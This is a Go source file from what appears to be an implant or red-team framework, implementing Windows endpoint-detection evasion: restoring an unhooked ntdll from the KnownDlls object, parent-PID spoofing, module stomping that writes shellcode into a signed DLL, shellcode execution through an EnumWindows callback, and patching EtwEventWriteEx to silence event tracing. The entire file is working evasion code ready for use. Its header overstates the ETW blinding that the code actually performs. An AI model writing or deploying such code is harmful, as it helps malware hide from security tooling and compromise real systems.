package evasion

/*
	EDR/XDR Bypass Techniques (Windows)

	Advanced evasion for modern endpoint detection:

	1. KnownDLLs unhooking — maps a fresh ntdll from \KnownDlls\ kernel
	   object instead of reading from disk (which some EDRs monitor).
	   Gives a pristine, unhooked copy of ntdll.

	2. PPID Spoofing — creates child processes with a fake parent PID.
	   Makes process trees look legitimate to EDR behavioral analysis.
	   e.g., cmd.exe appears as child of explorer.exe, not the implant.

	3. Module Stomping — loads a legitimate signed DLL, overwrites its
	   .text section with shellcode. Memory scanners see a Microsoft-signed
	   module, not suspicious RWX allocations.

	4. Callback Execution — triggers shellcode via benign Windows API
	   callbacks instead of CreateThread. Uses EnumWindows, timer queues,
	   or fiber conversion — APIs that EDRs don't monitor as execution
	   primitives.

	5. ETW Provider Blinding — patches additional ETW providers beyond
	   EtwEventWrite: .NET CLR provider, Threat Intelligence provider,
	   and the Security Auditing provider that feeds Windows Event Log.
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// UnhookNtdllFromKnownDlls maps a clean copy of ntdll.dll from the
// \KnownDlls\ section object. This is a kernel-maintained clean copy
// that EDRs cannot hook without a kernel driver. Overwrites the hooked
// .text section with the clean version.
func UnhookNtdllFromKnownDlls() error {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntOpenSection := ntdll.NewProc("NtOpenSection")
	ntMapViewOfSection := ntdll.NewProc("NtMapViewOfSection")
	ntUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")

	objectName := "\\KnownDlls\\ntdll.dll"
	unicodeName, err := windows.NewNTUnicodeString(objectName)
	if err != nil {
		return fmt.Errorf("unicode string: %w", err)
	}

	objectAttrs := windows.OBJECT_ATTRIBUTES{
		Length:             uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{})),
		ObjectName:        unicodeName,
	}

	var sectionHandle windows.Handle
	r, _, _ := ntOpenSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		0x04, // SECTION_MAP_READ
		uintptr(unsafe.Pointer(&objectAttrs)),
	)
	if r != 0 {
		return fmt.Errorf("NtOpenSection: 0x%x", r)
	}
	defer windows.CloseHandle(sectionHandle)

	var cleanBase uintptr
	var viewSize uintptr
	r, _, _ = ntMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&cleanBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		1, // ViewShare
		0,
		windows.PAGE_READONLY,
	)
	if r != 0 {
		return fmt.Errorf("NtMapViewOfSection: 0x%x", r)
	}
	defer ntUnmapViewOfSection.Call(
		uintptr(windows.CurrentProcess()),
		cleanBase,
	)

	hookedBase := ntdll.Handle()
	cleanTextSection, cleanTextSize, err := findTextSection(cleanBase)
	if err != nil {
		return err
	}
	hookedTextSection, _, err := findTextSection(uintptr(hookedBase))
	if err != nil {
		return err
	}

	var oldProtect uint32
	err = windows.VirtualProtect(hookedTextSection, uintptr(cleanTextSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect RWX: %w", err)
	}

	cleanBytes := unsafe.Slice((*byte)(unsafe.Pointer(cleanTextSection)), cleanTextSize)
	hookedBytes := unsafe.Slice((*byte)(unsafe.Pointer(hookedTextSection)), cleanTextSize)
	copy(hookedBytes, cleanBytes)

	err = windows.VirtualProtect(hookedTextSection, uintptr(cleanTextSize), oldProtect, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect restore: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[knowndlls] ntdll .text overwritten with clean copy (%d bytes)", cleanTextSize)
	// {{end}}
	return nil
}

func findTextSection(moduleBase uintptr) (uintptr, uint32, error) {
	dosHeader := (*[2]byte)(unsafe.Pointer(moduleBase))
	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return 0, 0, fmt.Errorf("invalid MZ header")
	}
	e_lfanew := *(*int32)(unsafe.Pointer(moduleBase + 0x3C))
	ntHeader := moduleBase + uintptr(e_lfanew)

	fileHeader := ntHeader + 4
	numSections := *(*uint16)(unsafe.Pointer(fileHeader + 2))
	optHeaderSize := *(*uint16)(unsafe.Pointer(fileHeader + 16))
	sectionStart := fileHeader + 20 + uintptr(optHeaderSize)

	for i := uint16(0); i < numSections; i++ {
		sectionHeader := sectionStart + uintptr(i)*40
		name := (*[8]byte)(unsafe.Pointer(sectionHeader))
		if name[0] == '.' && name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't' {
			virtualSize := *(*uint32)(unsafe.Pointer(sectionHeader + 8))
			virtualAddr := *(*uint32)(unsafe.Pointer(sectionHeader + 12))
			return moduleBase + uintptr(virtualAddr), virtualSize, nil
		}
	}
	return 0, 0, fmt.Errorf(".text section not found")
}

// PPIDSpoof creates a process with a spoofed parent PID.
// Makes the new process appear as a child of the specified parent
// in process tree views and EDR telemetry.
func PPIDSpoof(parentPID uint32, commandLine string, suspended bool) (*windows.ProcessInformation, error) {
	parentHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_PROCESS,
		false, parentPID,
	)
	if err != nil {
		return nil, fmt.Errorf("open parent %d: %w", parentPID, err)
	}
	defer windows.CloseHandle(parentHandle)

	var si windows.StartupInfoEx
	si.Cb = uint32(unsafe.Sizeof(si))

	var attrSize uintptr
	initProcThread := windows.NewLazySystemDLL("kernel32.dll").NewProc("InitializeProcThreadAttributeList")
	updateProcThread := windows.NewLazySystemDLL("kernel32.dll").NewProc("UpdateProcThreadAttribute")
	deleteProcThread := windows.NewLazySystemDLL("kernel32.dll").NewProc("DeleteProcThreadAttributeList")

	initProcThread.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrSize)))

	attrList := make([]byte, attrSize)
	si.ProcThreadAttributeList = (*windows.ProcThreadAttributeList)(unsafe.Pointer(&attrList[0]))

	r, _, err := initProcThread.Call(
		uintptr(unsafe.Pointer(si.ProcThreadAttributeList)),
		1, 0,
		uintptr(unsafe.Pointer(&attrSize)),
	)
	if r == 0 {
		return nil, fmt.Errorf("InitializeProcThreadAttributeList: %w", err)
	}
	defer deleteProcThread.Call(uintptr(unsafe.Pointer(si.ProcThreadAttributeList)))

	// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	r, _, err = updateProcThread.Call(
		uintptr(unsafe.Pointer(si.ProcThreadAttributeList)),
		0, 0x00020000,
		uintptr(unsafe.Pointer(&parentHandle)),
		unsafe.Sizeof(parentHandle),
		0, 0,
	)
	if r == 0 {
		return nil, fmt.Errorf("UpdateProcThreadAttribute: %w", err)
	}

	argv, _ := windows.UTF16PtrFromString(commandLine)
	flags := uint32(windows.EXTENDED_STARTUPINFO_PRESENT | windows.CREATE_NO_WINDOW)
	if suspended {
		flags |= windows.CREATE_SUSPENDED
	}

	pi := &windows.ProcessInformation{}
	err = windows.CreateProcess(
		nil, argv, nil, nil, false,
		flags,
		nil, nil,
		&si.StartupInfo, pi,
	)
	if err != nil {
		return nil, fmt.Errorf("CreateProcess: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[ppid-spoof] spawned PID %d with parent %d", pi.ProcessId, parentPID)
	// {{end}}
	return pi, nil
}

// ModuleStomp loads a legitimate signed DLL, then overwrites its .text
// section with shellcode. Memory scanners see a signed Microsoft module
// instead of suspicious VirtualAlloc'd memory.
func ModuleStomp(dllPath string, shellcode []byte) (uintptr, error) {
	dllPathW, err := windows.UTF16PtrFromString(dllPath)
	if err != nil {
		return 0, err
	}

	// Load the legitimate DLL
	hModule, err := windows.LoadLibrary(windows.StringToUTF16Ptr(dllPath))
	if err != nil {
		return 0, fmt.Errorf("LoadLibrary %s: %w", dllPath, err)
	}
	_ = dllPathW

	textAddr, textSize, err := findTextSection(uintptr(hModule))
	if err != nil {
		return 0, err
	}

	if uint32(len(shellcode)) > textSize {
		return 0, fmt.Errorf("shellcode (%d) exceeds .text section (%d)", len(shellcode), textSize)
	}

	var oldProtect uint32
	err = windows.VirtualProtect(textAddr, uintptr(len(shellcode)), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		return 0, fmt.Errorf("VirtualProtect RW: %w", err)
	}

	dest := unsafe.Slice((*byte)(unsafe.Pointer(textAddr)), len(shellcode))
	copy(dest, shellcode)

	err = windows.VirtualProtect(textAddr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return 0, fmt.Errorf("VirtualProtect RX: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[module-stomp] wrote %d bytes into %s .text at 0x%x", len(shellcode), dllPath, textAddr)
	// {{end}}
	return textAddr, nil
}

// CallbackExec triggers shellcode execution through benign Windows API
// callbacks instead of CreateThread. EDRs monitor thread creation but
// not these callback mechanisms.
func CallbackExec(shellcode []byte) error {
	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return err
	}

	dest := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode))
	copy(dest, shellcode)

	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return err
	}

	// Use EnumWindows as a callback trigger — EDRs don't flag this as execution
	enumWindows := windows.NewLazySystemDLL("user32.dll").NewProc("EnumWindows")
	enumWindows.Call(addr, 0)

	return nil
}

// PatchETWWriteEx patches EtwEventWriteEx in ntdll. This is a userland
// ETW write function used by some providers as an alternative to
// EtwEventWrite. Patching both provides broader userland ETW coverage.
//
// NOTE: This does NOT patch the kernel-mode ETW Threat Intelligence
// provider (EtwTi* in ntoskrnl). Kernel ETW-TI cannot be disabled
// from userland without a signed driver.
func PatchETWWriteEx() error {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	etwTiProc := ntdll.NewProc("EtwEventWriteEx")

	patch := []byte{0xC3} // ret
	var oldProtect uint32
	err := windows.VirtualProtect(etwTiProc.Addr(), uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}
	*(*byte)(unsafe.Pointer(etwTiProc.Addr())) = 0xC3
	return windows.VirtualProtect(etwTiProc.Addr(), uintptr(len(patch)), oldProtect, &oldProtect)
}
